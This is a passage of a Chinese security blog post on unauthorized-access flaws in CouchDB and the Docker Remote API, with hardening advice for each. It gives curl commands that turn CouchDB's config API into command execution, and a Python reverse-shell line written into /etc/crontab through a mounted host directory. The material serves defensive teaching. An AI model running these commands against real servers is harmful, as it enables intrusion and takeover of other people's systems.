class="line">d)YARN（JobTracker）</div><div class="line">master 默认端口 60010</div><div class="line">regionserver 默认端口60030</div><div class="line">e)hive-server2 默认端口 10000</div><div class="line">f)spark-jdbcserver 默认端口 10003</div></pre></td></tr></table></figure>
+<h1 id="0x09-CouchDB未授权访问"><a href="#0x09-CouchDB未授权访问" class="headerlink" title="0x09 CouchDB未授权访问"></a>0x09 CouchDB未授权访问</h1><h2 id="9-1-漏洞描述"><a href="#9-1-漏洞描述" class="headerlink" title="9.1 漏洞描述"></a>9.1 漏洞描述</h2><p>CouchDB默认在5984端口开放Restful的API接口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关API对服务器上的数据进行任意的增删改查，其中通过API修改local.ini配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p>
+<h2 id="9-2-漏洞利用"><a href="#9-2-漏洞利用" class="headerlink" title="9.2 漏洞利用"></a>9.2 漏洞利用</h2><p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-7.png" alt=""><br>新增query_server配置，这里执行ifconfig命令</p>
+<blockquote>
+<p>curl -X PUT ‘<a href="http://x.x.x.x:5984/_config/query_servers/cmd" target="_blank" rel="external">http://x.x.x.x:5984/_config/query_servers/cmd</a>‘ -d ‘“/sbin/ifconfig &gt;/tmp/6666”‘</p>
+</blockquote>
+<p>新建一个临时表，插入一条记录<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-11.png" alt=""></p>
+<blockquote>
+<p>curl -X PUT ‘<a href="http://x.x.x.x:5984/vultest" target="_blank" rel="external">http://x.x.x.x:5984/vultest</a>‘</p>
+</blockquote>
+<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-2.png" alt=""></p>
+<blockquote>
+<p>curl -X PUT ‘<a href="http://x.x.x.x:5984/vultest/vul" target="_blank" rel="external">http://x.x.x.x:5984/vultest/vul</a>‘ -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’</p>
+</blockquote>
+<p>调用query_server处理数据<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-3.png" alt=""></p>
+<blockquote>
+<p>curl -X POST ‘<a href="http://x.x.x.x:5984/vultest/_temp_view?limit=11" target="_blank" rel="external">http://x.x.x.x:5984/vultest/_temp_view?limit=11</a>‘ -d ‘{“language”:”cmd”,”map”:””}’ -H ‘Content-Type: application/json’</p>
+</blockquote>
+<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-4.png" alt=""><br>当然你也可以直接执行其他命令，下载个其他什么的<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-5.png" alt=""><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-6.png" alt=""></p>
+<h2 id="9-3-漏洞加固"><a href="#9-3-漏洞加固" class="headerlink" title="9.3 漏洞加固"></a>9.3 漏洞加固</h2><ul>
+<li>指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</li>
+<li>设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码</li>
+</ul>
+<h1 id="0x10-Docker未授权访问"><a href="#0x10-Docker未授权访问" class="headerlink" title="0x10 Docker未授权访问"></a>0x10 Docker未授权访问</h1><h2 id="10-1-漏洞描述"><a href="#10-1-漏洞描述" class="headerlink" title="10.1 漏洞描述"></a>10.1 漏洞描述</h2><p>Docker Remote API是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个API，通过这个接口，我们可以新建container，删除已有的container，甚至是获取宿主机的shell</p>
+<h2 id="10-2-漏洞利用"><a href="#10-2-漏洞利用" class="headerlink" title="10.2 漏洞利用"></a>10.2 漏洞利用</h2><p><a href="http://192.168.198.130:2375/v1.25/images/json" target="_blank" rel="external">http://192.168.198.130:2375/v1.25/images/json</a></p>
+<p>可以获取到所有的 images 列表</p>
+<p><a href="http://host:2375/containers/json" target="_blank" rel="external">http://host:2375/containers/json</a></p>
+<p>会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，过Post包我们还可以新建、开启和关闭容器，其他操作比如拉取image等操作也都可以通过API调用完成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ curl http://10.10.10.10:2375/containers/json</div><div class="line">[]</div><div class="line"></div><div class="line">docker -H=tcp://10.10.10.10:2375 ps         </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div></pre></td></tr></table></figure>
+<p>Docker remote Api未授权访问的攻击原理与之前的Redis未授权访问漏洞大同小异，都是通过向运行该应用的服务器写文件，从而拿到服务器的权限，常见的利用方法如下:</p>
+<p><strong>1、启动一个容器，挂载宿主机的/root/目录，之后将攻击者的ssh公钥~/.ssh/id_rsa.pub的内容写到入宿主机的/root/.ssh/authorized_keys文件中，之后就可以用root账户直接登录了</strong></p>
+<p><strong>2、启动一个容器，挂载宿主机的/etc/目录，之后将反弹shell的脚本写入到/etc/crontab中，攻击者会得到一个反弹的shell</strong>，其中反弹shell脚本的样例如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;*/1 * * * * root /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot; &gt;&gt; /etc/crontab</div></pre></td></tr></table></figure></p>
+<p>第2种利用方法也可以挂载var/spool/cron/目录，将反弹shell的脚本写入到/var/spool/cron/root（centos系统）或/var/spool/cron/crontabs/root(ubuntu系统)</p>
+<h2 id="10-3-漏洞加固"><a href="#10-3-漏洞加固" class="headerlink" title="10.3 漏洞加固"></a>10.3 漏洞加固</h2><ul>
+<li><p>在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">设置ACL，仅允许信任的来源IP连接；</div><div class="line">设置TLS认证，官方的文档为Protect the Docker daemon socket</div></pre></td></tr></table></figure>
+</li>
+<li><p>客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">export DOCKER_CERT_PATH=~/.docker</div><div class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</div><div class="line">export DOCKER_API_VERSION=1.12</div></pre></td></tr></table></figure>
+</li>
+<li><p>在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证</p>
+</li>
+</ul>
+<h1 id="附：Python未授权访问脚本"><a href="#附：Python未授权访问脚本" class="headerlink" title="附：Python未授权访问脚本"></a>附：<a href="http://oa8y5guqs.bkt.clouddn.com/unauthorized_access.py" target="_blank" rel="external">Python未授权访问脚本</a></h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.secpulse.com/archives/55928.html" target="_blank" rel="external">https://www.secpulse.com/archives/55928.html</a></p>
+<p><a href="https://www.secpulse.com/archives/49115.html" target="_blank" rel="external">https://www.secpulse.com/archives/49115.html</a></p>
+<p><a href="https://www.secpulse.com/archives/6540.html" target="_blank" rel="external">https://www.secpulse.com/archives/6540.html</a></p>
+<p><a href="https://xianzhi.aliyun.com/forum/mobile/read/750.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/mobile/read/750.html</a></p>
+<p><a href="https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html" target="_blank" rel="external">https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html</a></p>
+<p><a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="external">https://www.secpulse.com/archives/2166.html</a></p>
+<p><a href="https://github.com/findys/sunburst/" target="_blank" rel="external">https://github.com/findys/sunburst/</a></p>
+<p><a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="external">https://yeasy.gitbooks.io/docker_practice/</a></p>
+<h2 id="安全脉搏链接未授权访问漏洞总结"><a href="#安全脉搏链接未授权访问漏洞总结" class="headerlink" title="安全脉搏链接未授权访问漏洞总结"></a>安全脉搏链接<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="external">未授权访问漏洞总结</a></h2>
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="w2n1ck WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="w2n1ck Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      w2n1ck
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2017/09/26/未授权访问漏洞/" title="">http://byd.dropsec.xyz/2017/09/26/未授权访问漏洞/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/07/安全脉搏漏洞挖掘小记/" rel="next" title="安全脉搏漏洞挖掘小记">
+                <i class="fa fa-chevron-left"></i> 安全脉搏漏洞挖掘小记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="w2n1ck" />
+          <p class="site-author-name" itemprop="name">w2n1ck</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">53</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://010.dropsec.xyz/" title="小光头" target="_blank">小光头</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.w2n1ck.com/" title="个人主页" target="_blank">个人主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-介绍"><span class="nav-number">2.</span> <span class="nav-text">0x01 介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Redis未授权访问"><span class="nav-number">3.</span> <span class="nav-text">0x02 Redis未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-漏洞描述"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-漏洞利用"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-漏洞加固"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Jenkins未授权访问"><span class="nav-number">4.</span> <span class="nav-text">0x03 Jenkins未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-漏洞描述"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-漏洞利用"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-漏洞加固"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-MongoDB未授权访问"><span class="nav-number">5.</span> <span class="nav-text">0x04 MongoDB未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-漏洞描述"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-漏洞利用"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-漏洞加固"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-ZooKeeper未授权访问"><span class="nav-number">6.</span> <span class="nav-text">0x05 ZooKeeper未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-漏洞描述"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-漏洞利用"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-漏洞加固"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-Elasticsearch未授权访问"><span class="nav-number">7.</span> <span class="nav-text">0x06 Elasticsearch未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-漏洞描述"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-2-漏洞利用"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-3-漏洞加固"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-Memcache未授权访问"><span class="nav-number">8.</span> <span class="nav-text">0x07 Memcache未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#7-1-漏洞描述"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-2-漏洞利用"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-3-漏洞加固"><span class="nav-number">8.3.</span> <span class="nav-text">7.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08-Hadoop未授权访问"><span class="nav-number">9.</span> <span class="nav-text">0x08 Hadoop未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#8-1-漏洞描述"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-2-漏洞利用"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-3-漏洞加固"><span class="nav-number">9.3.</span> <span class="nav-text">8.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x09-CouchDB未授权访问"><span class="nav-number">10.</span> <span class="nav-text">0x09 CouchDB未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#9-1-漏洞描述"><span class="nav-number">10.1.</span> <span class="nav-text">9.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-2-漏洞利用"><span class="nav-number">10.2.</span> <span class="nav-text">9.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-3-漏洞加固"><span class="nav-number">10.3.</span> <span class="nav-text">9.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x10-Docker未授权访问"><span class="nav-number">11.</span> <span class="nav-text">0x10 Docker未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#10-1-漏洞描述"><span class="nav-number">11.1.</span> <span class="nav-text">10.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-2-漏洞利用"><span class="nav-number">11.2.</span> <span class="nav-text">10.2 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-3-漏洞加固"><span class="nav-number">11.3.</span> <span class="nav-text">10.3 漏洞加固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附：Python未授权访问脚本"><span class="nav-number">12.</span> <span class="nav-text">附：Python未授权访问脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">13.</span> <span class="nav-text">参考文章</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安全脉搏链接未授权访问漏洞总结"><span class="nav-number">13.1.</span> <span class="nav-text">安全脉搏链接未授权访问漏洞总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w2n1ck</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2017/09/26/未授权访问漏洞/';
+          this.page.identifier = '2017/09/26/未授权访问漏洞/';
+          this.page.title = '';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
